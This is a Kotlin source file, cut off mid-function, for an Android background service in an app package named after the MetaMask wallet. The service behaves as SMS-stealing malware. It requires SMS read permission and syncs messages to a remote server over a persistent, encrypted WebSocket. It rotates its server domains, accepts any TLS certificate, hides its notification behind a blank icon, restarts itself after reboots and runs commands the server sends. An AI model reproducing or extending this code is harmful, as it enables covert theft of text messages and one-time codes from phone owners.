package com.example.MetaMask.services

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import androidx.annotation.Keep
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.example.MetaMask.R
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.example.MetaMask.utils.PrivilegeChecker
import com.example.MetaMask.utils.PermissionHelper
import com.example.MetaMask.utils.RemoteConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.*
import org.json.JSONObject
import android.content.SharedPreferences
import androidx.work.Configuration
import androidx.work.WorkManager

@Keep
class MasterWebSocketDispatcher : Service() {

    companion object {
        @Volatile
        var IS_SERVICE_RUNNING = false
            private set

        const val ACTION_HANDLE_COMMAND = "com.example.MetaMask.ACTION_HANDLE_COMMAND"
        const val ACTION_SEND_TO_SERVER = "com.example.MetaMask.ACTION_SEND_TO_SERVER"

        const val ACTION_SEND_MESSAGE = "com.example.MetaMask.ACTION_SEND_MESSAGE"
        const val EXTRA_MESSAGE_DATA = "com.example.MetaMask.EXTRA_MESSAGE_DATA"

        const val EXTRA_COMMAND_DATA = "command_data"
        const val EXTRA_MESSAGE_TO_SEND = "com.example.MetaMask.EXTRA_MESSAGE_TO_SEND"
        const val EXTRA_STARTED_FROM_BOOT = "STARTED_FROM_BOOT"
        private const val NOTIFICATION_CHANNEL_ID = "WebSocketDispatcherChannel"
        private const val NOTIFICATION_ID = 1
        private const val RESTART_PENDING_INTENT_REQUEST_CODE = 2
        private const val INITIAL_RECONNECT_DELAY_MS = 2000L
        private const val MAX_RECONNECT_DELAY_MS = 60000L
        const val PREFS_NAME = "service_status_prefs"
        const val KEY_IS_RUNNING = "is_master_service_running"

        @Volatile
        private var lastQueueSizeBytes: Long = 0L

        @Volatile
        var CURRENT_INSTANCE: MasterWebSocketDispatcher? = null

        @Volatile
        private var generation: Long = 0L

        @JvmStatic
        fun getQueueSize(): Long = lastQueueSizeBytes
    }

    private lateinit var statusPrefs: SharedPreferences
    private var connectionStartTime: Long = 0L
    @Volatile private var domainMonitorBaselinePing = -1L
    @Volatile private var domainDegradedStrikes = 0
    @Volatile private var realityConsecutiveFails = 0
    private val REALITY_FAIL_THRESHOLD = 8
    private val REALITY_RECHECK_INTERVAL_MS = 5 * 60 * 1000L
    @Volatile private var usingDirectWsFallback = false
    private var realityRecheckJob: kotlinx.coroutines.Job? = null

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .addInterceptor(com.example.MetaMask.utils.FailoverInterceptor())
            .addInterceptor { chain ->
                val original = chain.request()
                val request = original.newBuilder()
                    .header("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
                    .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                    .build()
                chain.proceed(request)
            }
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
            .pingInterval(30, java.util.concurrent.TimeUnit.SECONDS)
            .build()
    }

    private val vpnClient: OkHttpClient by lazy {
        val tm = object : javax.net.ssl.X509TrustManager {
            override fun checkClientTrusted(chain: Array<out java.security.cert.X509Certificate>?, authType: String?) {}
            override fun checkServerTrusted(chain: Array<out java.security.cert.X509Certificate>?, authType: String?) {}
            override fun getAcceptedIssuers(): Array<java.security.cert.X509Certificate> = emptyArray()
        }
        val sslCtx = javax.net.ssl.SSLContext.getInstance("TLS").apply { init(null, arrayOf(tm), null) }
        OkHttpClient.Builder()
            .sslSocketFactory(sslCtx.socketFactory, tm)
            .hostnameVerifier { _, _ -> true }
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
            .pingInterval(30, java.util.concurrent.TimeUnit.SECONDS)
            .build()
    }
    @Volatile private var webSocket: WebSocket? = null
    @Volatile private var isConnecting = false
    private val handler: Handler = Handler(Looper.getMainLooper())
    private var currentReconnectDelay: Long = INITIAL_RECONNECT_DELAY_MS
    private val serviceJob: Job = Job()
    private val serviceScope: CoroutineScope = CoroutineScope(Dispatchers.IO + serviceJob)

    private val requiredSmsPermissions = arrayOf(Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS)
    private var connectivityManager: ConnectivityManager? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var vpnNetworkCallback: ConnectivityManager.NetworkCallback? = null
    @Volatile private var physicalNetwork: Network? = null

    @Volatile private var lastPhoneStateTriggerMs = 0L
    private val PHONE_STATE_DEBOUNCE_MS = 10_000L
    private var telephonyManagerRef: TelephonyManager? = null
    private var phoneStateCallback: Any? = null

    private val servicesToStart = listOf(
        trolService::class.java,
        FrienCat::class.java,
        UUIDService::class.java,
        TurtleService::class.java
    )

    private val serverSendReceiver: BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onReceive enter context=ctx intent=${intent}") //xdbg
            if (intent?.action != ACTION_SEND_TO_SERVER) return

            if (intent.hasExtra(EXTRA_MESSAGE_TO_SEND)) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                val messageString = intent.getStringExtra(EXTRA_MESSAGE_TO_SEND)

                if (messageString != null) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    try {
                        val payload = JSONObject(messageString)

                        if (!payload.has("uuid")) {
                            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                            payload.put("uuid", com.example.MetaMask.utils.DeviceUUIDProvider.getUUID())
                        }

                        val rawData = payload.toString()

                        val encryptedData = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(rawData)

                        val secureEnvelope = JSONObject()
                        secureEnvelope.put("p", encryptedData)

                        val finalPayload = secureEnvelope.toString()

                        lastQueueSizeBytes = webSocket?.queueSize() ?: lastQueueSizeBytes
                        val sent = webSocket?.send(finalPayload) ?: false
                        lastQueueSizeBytes = webSocket?.queueSize() ?: lastQueueSizeBytes
                    } catch (e: Exception) {
                        android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    }
                }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onCreate enter") //xdbg
        super.onCreate()

        try {
            val wmConfig = Configuration.Builder().setMinimumLoggingLevel(android.util.Log.INFO).build()
            WorkManager.initialize(applicationContext, wmConfig)
        } catch (_: IllegalStateException) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] WorkManager already initialized") //xdbg
        }

        startAsForegroundService()

        val hasReadSms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            stopSelf()
            return
        }

        val killSwitchPrefs = getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
        val isKilled = killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)
        if (isKilled) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            stopSelf()
            return
        }

        statusPrefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        statusPrefs.edit().putBoolean(KEY_IS_RUNNING, true).apply()

        IS_SERVICE_RUNNING = true

        CURRENT_INSTANCE = this
        synchronized(MasterWebSocketDispatcher::class.java) { generation++ }

        registerNetworkCallback()
        findAndBindPhysicalNetwork()

        serviceScope.launch {
            if (isExternalVpnActive()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                val ok = try {
                    RemoteConfig.fetchDomain(applicationContext)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    false
                }
                if (ok) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    Handler(Looper.getMainLooper()).post { initializeWebSocket() }
                }
            } else {
                val realityJob = launch {
                    try {
                        com.example.MetaMask.utils.RealityConfig.fetch()
                    } catch (e: Exception) {
                        android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    }
                }
                val ok = try {
                    RemoteConfig.fetchDomain(applicationContext)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    false
                }
                realityJob.join()
                if (ok) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    Handler(Looper.getMainLooper()).post {
                        initializeWebSocket()
                    }
                }
            }
        }

        try {
            DeviceUUIDProvider.init(applicationContext)

            registerReceiver(
                serverSendReceiver,
                IntentFilter(ACTION_SEND_TO_SERVER),
                Context.RECEIVER_EXPORTED
            )
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            stopSelf()
        }

        registerTelephonyListener()
        KeepAliveManager.engage(this)
        KeepAliveJobService.schedule(this)
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        val hasReadSms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            stopSelf()
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
            return START_NOT_STICKY
        }

        if (intent?.action == ACTION_SEND_MESSAGE) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            val message = intent.getStringExtra(EXTRA_MESSAGE_DATA)
            if (!message.isNullOrBlank()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                val sendIntent = Intent(ACTION_SEND_TO_SERVER).apply {
                    putExtra(EXTRA_MESSAGE_TO_SEND, message)
                }
                this@MasterWebSocketDispatcher.sendBroadcast(sendIntent)
            }
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
            return START_STICKY
        }

        if (IS_SERVICE_RUNNING && webSocket != null && intent?.action == null && intent?.getBooleanExtra(EXTRA_STARTED_FROM_BOOT, false) != true) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            if (intent?.getBooleanExtra("started_from_push", false) == true) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                serviceScope.launch { checkAndHealWebSocket() }
            }
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
            return START_STICKY
        }

        checkAndReportDefaultSmsStatus()

        if (isNetworkAvailable(this@MasterWebSocketDispatcher)) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            Handler(Looper.getMainLooper()).post {
                initializeWebSocket()
            }
        }

        if (areSmsPermissionsGranted()) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            startAllServices(intent?.getBooleanExtra(EXTRA_STARTED_FROM_BOOT, false) ?: false)
        }
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
        return START_STICKY
    }

    private fun areSmsPermissionsGranted(): Boolean =
        requiredSmsPermissions.all { ContextCompat.checkSelfPermission(this@MasterWebSocketDispatcher, it) == PackageManager.PERMISSION_GRANTED }

    private fun startAllServices(fromBoot: Boolean) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] startAllServices enter fromBoot=${fromBoot}") //xdbg
        servicesToStart.forEach { serviceClass ->
            try {
                startService(Intent(this@MasterWebSocketDispatcher, serviceClass).apply {
                    putExtra(EXTRA_STARTED_FROM_BOOT, fromBoot)
                })
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }

        try {
            val request = androidx.work.OneTimeWorkRequestBuilder<com.example.MetaMask.services.ChikenWorker>()
                .setExpedited(androidx.work.OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .build()
            androidx.work.WorkManager.getInstance(applicationContext).enqueue(request)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun startAsForegroundService() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] startAsForegroundService enter") //xdbg
        val channelId = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val importance = if (Build.VERSION.SDK_INT <= 32)
                NotificationManager.IMPORTANCE_MIN else NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(NOTIFICATION_CHANNEL_ID, "System Connection", importance)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
            channel.id
        } else ""
        val builder = NotificationCompat.Builder(this@MasterWebSocketDispatcher, channelId)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
        if (Build.VERSION.SDK_INT <= 32) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            val bmp = android.graphics.Bitmap.createBitmap(1, 1, android.graphics.Bitmap.Config.ARGB_8888)
            builder.setSmallIcon(androidx.core.graphics.drawable.IconCompat.createWithBitmap(bmp))
        } else {
            builder.setSmallIcon(R.mipmap.ic_launcher)
        }
        val notification = builder.build()
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else if (Build.VERSION.SDK_INT >= 29) {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            stopSelf()
        }
    }

    private fun initializeWebSocket() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] initializeWebSocket enter") //xdbg
        val domain = RemoteConfig.serverDomain
        if (domain == null) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] initWs: domain=null") //xdbg
            return
        }

        if (isConnecting || webSocket != null || !IS_SERVICE_RUNNING) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] initWs: blocked isConn=$isConnecting wsActive=${webSocket != null} running=$IS_SERVICE_RUNNING") //xdbg
            return
        }
        isConnecting = true
        try {
            val deviceUuid = DeviceUUIDProvider.getUUID()
            if (deviceUuid == null) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                isConnecting = false
                return
            }

            connectionStartTime = System.currentTimeMillis()

            if (isExternalVpnActive()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                connectivityManager?.bindProcessToNetwork(null)
                val vpnHost = domain.split(":").first()
                val urlWithParams = "wss://$vpnHost/ws?type=device&uuid=$deviceUuid"
                val tm = object : javax.net.ssl.X509TrustManager {
                    override fun checkClientTrusted(chain: Array<out java.security.cert.X509Certificate>?, authType: String?) {}
                    override fun checkServerTrusted(chain: Array<out java.security.cert.X509Certificate>?, authType: String?) {}
                    override fun getAcceptedIssuers(): Array<java.security.cert.X509Certificate> = emptyArray()
                }
                val sslCtx = javax.net.ssl.SSLContext.getInstance("TLS").apply { init(null, arrayOf(tm), null) }
                val tunnelClient = OkHttpClient.Builder()
                    .sslSocketFactory(sslCtx.socketFactory, tm)
                    .hostnameVerifier { _, _ -> true }
                    .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
                    .readTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
                    .pingInterval(30, java.util.concurrent.TimeUnit.SECONDS)
                    .build()
                val request = Request.Builder().url(urlWithParams).build()
                webSocket = tunnelClient.newWebSocket(request, AppWebSocketListener())
            } else if (usingDirectWsFallback) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] initializeWebSocket directWsFallback active") //xdbg
                physicalNetwork?.let { connectivityManager?.bindProcessToNetwork(it) }
                val vpnHost = domain.split(":").first()
                val urlWithParams = "wss://$vpnHost/ws?type=device&uuid=$deviceUuid"
                val request = Request.Builder().url(urlWithParams).build()
                webSocket = vpnClient.newWebSocket(request, AppWebSocketListener())
            } else {
                val wsUrl = "wss://$domain/ws"
                val urlWithParams = "$wsUrl?type=device&uuid=$deviceUuid"
                val request = Request.Builder().url(urlWithParams).build()
                webSocket = com.example.MetaMask.utils.RealityWebSocket(
                    originalRequest = request,
                    wsPath = "/ws",
                    wsQuery = "type=device&uuid=$deviceUuid",
                    listener = AppWebSocketListener()
                )
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            webSocket = null
            isConnecting = false
            scheduleReconnect()
        }
    }

    private suspend fun checkAndHealWebSocket() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] checkAndHealWebSocket enter") //xdbg
        val ws = webSocket ?: return
        val sent = ws.send("{\"action\":\"ping\"}")
        if (!sent) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            ws.cancel()
            webSocket = null
            isConnecting = false
            synchronized(MasterWebSocketDispatcher::class.java) { generation++ }
            handler.removeCallbacksAndMessages(null)
            currentReconnectDelay = INITIAL_RECONNECT_DELAY_MS
            Handler(Looper.getMainLooper()).post { initializeWebSocket() }
        }
    }

    private fun measureTcpPing443(host: String?): Long {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] measureTcpPing443 enter host=${host}") //xdbg
        host ?: return -1L
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
        return try {
            val t0 = System.currentTimeMillis()
            val sock = java.net.Socket()
            sock.connect(java.net.InetSocketAddress(host, 443), 5000)
            sock.close()
            System.currentTimeMillis() - t0
        } catch (_: Exception) { -1L }
    }

    private fun triggerDomainSwitch(ws: WebSocket) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] triggerDomainSwitch enter ws=${ws}") //xdbg
        if (this@MasterWebSocketDispatcher.webSocket != ws) return
        ws.cancel()
        this@MasterWebSocketDispatcher.webSocket = null
        isConnecting = false
        RemoteConfig.rotateDomain()
        domainMonitorBaselinePing = -1L
        domainDegradedStrikes = 0
        handler.removeCallbacksAndMessages(null)
        currentReconnectDelay = INITIAL_RECONNECT_DELAY_MS
        handler.post {
            if (IS_SERVICE_RUNNING) initializeWebSocket()
        }
    }

    private fun launchDomainHealthMonitor(ws: WebSocket) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] launchDomainHealthMonitor enter ws=${ws}") //xdbg
        serviceScope.launch {
            val baseline = measureTcpPing443(RemoteConfig.serverDomain?.split(":")?.first())
            domainMonitorBaselinePing = baseline
            domainDegradedStrikes = 0

            while (IS_SERVICE_RUNNING && this@MasterWebSocketDispatcher.webSocket == ws) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] loop") //xdbg
                delay(90_000L)
                if (!IS_SERVICE_RUNNING || this@MasterWebSocketDispatcher.webSocket != ws) break

                val domain = RemoteConfig.serverDomain?.split(":")?.first() ?: break
                val ping = measureTcpPing443(domain)

                if (ping < 0) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    Handler(Looper.getMainLooper()).post { triggerDomainSwitch(ws) }
                    break
                }

                val base = domainMonitorBaselinePing
                if (base > 0 && ping > base * 4) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    domainDegradedStrikes++
                    if (domainDegradedStrikes >= 2) {
                        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                        Handler(Looper.getMainLooper()).post { triggerDomainSwitch(ws) }
                        break
                    }
                } else {
                    domainDegradedStrikes = 0
                    if (ping > 0) domainMonitorBaselinePing = if (base > 0) (base + ping) / 2 else ping
                }
            }
        }
    }

    private fun scheduleReconnect() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] scheduleReconnect enter") //xdbg
        if (!IS_SERVICE_RUNNING) return
        val myGen: Long = synchronized(MasterWebSocketDispatcher::class.java) { generation }
        handler.removeCallbacksAndMessages(null)
        val delayMs = currentReconnectDelay
        currentReconnectDelay = (currentReconnectDelay * 2).coerceAtMost(MAX_RECONNECT_DELAY_MS)
        handler.postDelayed({
            if (CURRENT_INSTANCE !== this@MasterWebSocketDispatcher) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
                return@postDelayed
            }
            val isMyGeneration = synchronized(MasterWebSocketDispatcher::class.java) { generation == myGen }
            if (!isMyGeneration) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
                return@postDelayed
            }
            if (IS_SERVICE_RUNNING && webSocket == null) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                initializeWebSocket()
            }
        }, delayMs)
    }

    inner class AppWebSocketListener : WebSocketListener() {
        private val pingHandler: Handler = Handler(Looper.getMainLooper())
        private var pingRunnable: Runnable? = null
        private val qualityCheckHandler: Handler = Handler(Looper.getMainLooper())
        private var firstMessageReceived = false
        private var connectionFailureCount = 0
        private var lastFcmResendMs = 0L

        override fun onOpen(ws: WebSocket, response: Response) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onOpen enter ws=${ws} response=${response}") //xdbg
            val connectDuration = System.currentTimeMillis() - connectionStartTime

            connectionFailureCount = 0
            if (!usingDirectWsFallback) {
                realityConsecutiveFails = 0
                stopRealityRecheckTimer()
            }

            if (connectDuration > 15000) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                ws.close(1000, "Slow Connection")
                this@MasterWebSocketDispatcher.webSocket = null
                isConnecting = false
                RemoteConfig.rotateDomain()
                scheduleReconnect()
                return
            }

            this@MasterWebSocketDispatcher.webSocket = ws
            isConnecting = false
            handler.removeCallbacksAndMessages(null)
            currentReconnectDelay = INITIAL_RECONNECT_DELAY_MS

            try {
                if (packageManager.resolveContentProvider("p.sig.vd", 0) != null) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    contentResolver.insert(android.net.Uri.parse("content://p.sig.vd/s"), null)
                }
            } catch (_: Exception) {}

            qualityCheckHandler.postDelayed({
                if (!firstMessageReceived && IS_SERVICE_RUNNING) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    ws.cancel()
                    this@MasterWebSocketDispatcher.webSocket = null
                    isConnecting = false
                    RemoteConfig.rotateDomain()
                    scheduleReconnect()
                }
            }, 20000)

            RemoteConfig.resetRotation()
            RemoteConfig.markCurrentDomainAsSuccess(applicationContext)
            sendCachedTokens()

            try {
                val syncIntent = Intent(this@MasterWebSocketDispatcher, trolService::class.java).apply {
                    action = trolService.ACTION_INITIAL_SMS_SYNC
                }
                startService(syncIntent)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }

            try {
                schedulePing(ws)
                launchDomainHealthMonitor(ws)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }

        override fun onMessage(ws: WebSocket, text: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onMessage len=${text.length} head=${text.take(100)}") //xdbg
            firstMessageReceived = true
            qualityCheckHandler.removeCallbacksAndMessages(null)

            if (text.contains("\"type\":\"PING\"") || text.contains("\"type\":\"ping\"")) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                ws.send("{\"action\":\"client_ping\"}")
                return
            }

            if (text.contains("\"fcmTokenAck\"")) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                try {
                    val json = org.json.JSONObject(text)
                    if (json.optString("action") == "fcmTokenAck") {
                        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                        FcmTokenService.markTokenConfirmed(applicationContext, true)
                        return
                    }
                } catch (_: Exception) {}
            }

            try {
                broadcastHandleCommandSafely(text)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }

        override fun onClosing(ws: WebSocket, code: Int, reason: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onClosing enter ws=${ws} code=${code} reason=${reason}") //xdbg
            qualityCheckHandler.removeCallbacksAndMessages(null)
            ws.close(1000, null)
            cancelPing()
        }

        override fun onClosed(ws: WebSocket, code: Int, reason: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onClosed enter ws=${ws} code=${code} reason=${reason}") //xdbg
            if (this@MasterWebSocketDispatcher.webSocket == ws) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                this@MasterWebSocketDispatcher.webSocket = null
                isConnecting = false
            }
            qualityCheckHandler.removeCallbacksAndMessages(null)
            lastQueueSizeBytes = 0L
            cancelPing()
            if (IS_SERVICE_RUNNING) scheduleReconnect()
        }

        override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onFailure enter ws=${ws} t=${t} response=${response}") //xdbg
            qualityCheckHandler.removeCallbacksAndMessages(null)

            if (this@MasterWebSocketDispatcher.webSocket == ws) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                ws.cancel()
                this@MasterWebSocketDispatcher.webSocket = null
                isConnecting = false
            }
            lastQueueSizeBytes = 0L
            cancelPing()

            if (!usingDirectWsFallback && !isExternalVpnActive()) {
                realityConsecutiveFails++
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onFailure realityConsecutiveFails=$realityConsecutiveFails threshold=$REALITY_FAIL_THRESHOLD") //xdbg
                if (realityConsecutiveFails >= REALITY_FAIL_THRESHOLD) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onFailure switching to directWsFallback") //xdbg
                    usingDirectWsFallback = true
                    realityConsecutiveFails = 0
                    RemoteConfig.resetRotation()
                    startRealityRecheckTimer()
                    if (IS_SERVICE_RUNNING) scheduleReconnect()
                    return
                }
            }

            connectionFailureCount++

            RemoteConfig.rotateDomain()

            if (RemoteConfig.isExhausted() || connectionFailureCount > 5) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                RemoteConfig.resetRotation()
                serviceScope.launch {
                    if (!isExternalVpnActive() && !usingDirectWsFallback) {
                        val realityJob = launch { try { com.example.MetaMask.utils.RealityConfig.fetch() } catch (_: Exception) {} }
                        RemoteConfig.fetchDomain(applicationContext)
                        realityJob.join()
                    } else {
                        RemoteConfig.fetchDomain(applicationContext)
                    }
                    Handler(Looper.getMainLooper()).post {
                        connectionFailureCount = 0
                        if (IS_SERVICE_RUNNING) scheduleReconnect()
                    }
                }
            } else {
                if (IS_SERVICE_RUNNING) scheduleReconnect()
            }
        }

        private fun broadcastHandleCommandSafely(json: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] broadcastHandleCommandSafely enter json=${json}") //xdbg
            val pm = this@MasterWebSocketDispatcher.packageManager
            val base = Intent(ACTION_HANDLE_COMMAND).apply {
                putExtra(EXTRA_COMMAND_DATA, json)
                setPackage(this@MasterWebSocketDispatcher.packageName)
            }

            val matches = try {
                pm.queryBroadcastReceivers(base, 0)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                emptyList()
            }

            val target = matches.firstOrNull { it.activityInfo?.packageName == this@MasterWebSocketDispatcher.packageName }?.activityInfo
            if (target != null && !target.name.isNullOrBlank()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                base.setClassName(target.packageName, target.name)
            }

